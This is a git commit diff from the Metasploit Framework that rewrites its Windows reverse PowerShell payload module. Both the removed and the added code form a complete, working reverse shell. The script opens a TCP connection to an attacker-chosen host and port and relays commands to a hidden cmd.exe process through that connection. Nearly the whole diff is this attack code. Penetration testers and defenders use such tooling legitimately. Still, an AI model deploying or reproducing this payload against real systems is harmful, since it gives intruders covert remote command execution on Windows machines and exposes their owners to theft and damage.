5497876fd208656a7803474f60c39e553e2b0ead
Tim W <timrlw@gmail.com>
2020-02-19 07:27:12 +0800

    fix #12579, make reverse_powershell great again

--- modules/payloads/singles/cmd/windows/reverse_powershell.rb
+++ modules/payloads/singles/cmd/windows/reverse_powershell.rb
@@ -10,7 +10,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 1228
+  CachedSize = 1060
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -57,45 +57,48 @@ module MetasploitModule
   def command_string
     lhost = datastore['LHOST']
     lport = datastore['LPORT']
-    powershell = "function RSC{"\
-          "if ($c.Connected -eq $true) {$c.Close()};"\
-          "if ($p.ExitCode -ne $null) {$p.Close()};"\
-          "exit;"\
-        "};"\
-        "$a='#{lhost}';$p='#{lport}';$c=New-Object system.net.sockets.tcpclient;"\
-        "$c.connect($a,$p);$s=$c.GetStream();"\
-        "$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"\
-        "$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';"\
-        "$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;"\
-        "$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;"\
-        "$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;"\
-        "while($os.Peek() -ne -1){"\
-          "$o += $e.GetString($os.Read())"\
-        "};"\
-        "$s.Write($e.GetBytes($o),0,$o.Length);"\
-        "$o=$null;$d=$false;$t=0;"\
-        "while (-not $d) {"\
-          "if ($c.Connected -ne $true) {RSC};"\
-          "$pos=0;$i=1; "\
-          "while (($i -gt 0) -and ($pos -lt $nb.Length)) {"\
-            "$r=$s.Read($nb,$pos,$nb.Length - $pos);"\
-            "$pos+=$r;"\
-            "if (-not $pos -or $pos -eq 0) {RSC};"\
-            "if ($nb[0..$($pos-1)] -contains 10) {break}};"\
-            "if ($pos -gt 0){"\
-              "$str=$e.GetString($nb,0,$pos);"\
-              "$is.write($str);start-sleep 1;"\
-              "if ($p.ExitCode -ne $null){RSC}else{"\
-                "$o=$e.GetString($os.Read());"\
-                "while($os.Peek() -ne -1){"\
-                  "$o += $e.GetString($os.Read());"\
-                  "if ($o -eq $str) {$o=''}"\
-                "};"\
-                "$s.Write($e.GetBytes($o),0,$o.length);"\
-                "$o=$null;"\
-                "$str=$null"\
-              "}"\
-            "}else{RSC}};"\
+    powershell = %Q^
+$a='#{lhost}';
+$b=#{lport};
+$c=New-Object system.net.sockets.tcpclient;
+$nb=New-Object System.Byte[] $c.ReceiveBufferSize;
+$ob=New-Object System.Byte[] 65536;
+$e=new-object System.Text.AsciiEncoding;
+$p=New-Object System.Diagnostics.Process;
+$p.StartInfo.FileName='cmd.exe';
+$p.StartInfo.RedirectStandardInput=1;
+$p.StartInfo.RedirectStandardOutput=1;
+$p.StartInfo.UseShellExecute=0;
+$p.Start();
+$is=$p.StandardInput;
+$os=$p.StandardOutput;
+$osread = $os.BaseStream.ReadAsync($ob, 0, $ob.Length);
+$c.connect($a,$b);
+$s=$c.GetStream();
+$s.ReadTimeout = 1000;
+while ($true) {
+    if ($osread.IsCompleted -and $osread.Result -ne 0) {
+      $s.Write($ob,0,$osread.Result);
+      $s.Flush();
+      $osread = $os.BaseStream.ReadAsync($ob, 0, $ob.Length);
+    }
+    if ($s.DataAvailable) {
+      $r=$s.Read($nb,0,$nb.Length);
+      if ($r -lt 1) {
+          break;
+      } else {
+          $str=$e.GetString($nb,0,$r);
+          $is.write($str);
+      }
+    }
+    if ($c.Connected -eq $false) {
+        break;
+    };
+    if ($p.ExitCode -ne $null) {
+        break;
+    };
+};
+^.gsub!("\n", "")
 
     "powershell -w hidden -nop -c #{powershell}"
   end
